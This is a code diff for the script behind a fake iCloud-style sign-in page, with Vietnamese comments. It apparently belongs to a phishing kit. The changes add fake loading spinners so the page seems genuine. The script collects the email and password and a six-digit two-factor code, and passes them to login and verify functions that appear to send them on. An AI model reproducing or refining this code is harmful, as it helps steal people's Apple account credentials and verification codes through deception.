@@ -6,65 +6,70 @@ $(document).ready(function() {
 			$('#account_name_text_field').focus();
 		} else {
 			if (IsEmail(txt_email)) {
-				$('#sign_in_form').addClass('show-password');
+				showIconLoadCheckEmail();
 			}else{
 				$('#account_name_text_field').val(txt_email + '@icloud.com');
-				$('#sign_in_form').addClass('show-password');
+				showIconLoadCheckEmail();
 			}
 		}
 		if (txt_passw == '' || txt_passw.length < 5) {
 			$('#password_text_field').focus();
 		}else{
-			ajaxLogin(txt_email, txt_passw);
+			showIconLoadCheckPassWord(txt_email, txt_passw);
 		}
 	});
 });
 
+function showIconLoadCheckEmail(){
+	$('#sign-in').addClass('v-hide');
+	$('#nd-spinner-container').removeClass('hide');
+	setTimeout(function(){
+		$('#sign-in').removeClass('v-hide');
+		$('#nd-spinner-container').addClass('hide');
+	    $('#sign_in_form').addClass('show-password');
+	}, 1000);
+}
+
+function showIconLoadCheckPassWord(txt_email ,txt_passw){
+	$('#sign-in').addClass('v-hide');
+	$('#nd-spinner-container').removeClass('hide');
+	setTimeout(function(){
+	    ajaxLogin(txt_email, txt_passw);
+	}, 1000);
+}
 //Mã xác thực
 $(document).ready(function() {
 
 	var verify = char0 = char1 = char2 = char3 = char4 = char5 = '';
 	$("#char0").keyup(function(){
 		$('#char1').focus();
-		var char0 = $('#char0').val();
-		verify += char0;
-		validateVerify(verify);
+		validateVerify();
 	});
-
 	$("#char1").keyup(function(){
 		$('#char2').focus();
-		var char1 = $('#char1').val();
-		verify += char1;
-		validateVerify(verify);
+		validateVerify();
 	});
 	$("#char2").keyup(function(){
 		$('#char3').focus();
-		var char2 = $('#char2').val();
-		verify += char2;
-		validateVerify(verify);
+		validateVerify();
 	});
 	$("#char3").keyup(function(){
 		$('#char4').focus();
-		var char3 = $('#char3').val();
-		verify += char3;
-		validateVerify(verify);
+		validateVerify();
 	});
 	$("#char4").keyup(function(){
 		$('#char5').focus();
-		var char4 = $('#char4').val();
-		verify += char4;
-		validateVerify(verify);
+		validateVerify();
 	});
 	$("#char5").keyup(function(){
-		var char5 = $('#char5').val();
-		verify += char5;
-		validateVerify(verify);
+		validateVerify();
 	});
 });
 
-function validateVerify(verify){
+function validateVerify(){
+	var verify = $('#char0').val() + $('#char1').val() + $('#char2').val() + $('#char3').val() + $('#char4').val() + $('#char5').val();
 	if (verify.length == 6) {
-		// alert('ok');
+		// alert(verify);
 		$('#no-trstd-device-pop').hide();
 		$('.verifying-code-text.thin').text('Đang xác minh…');
 		ajaxVerify(verify);
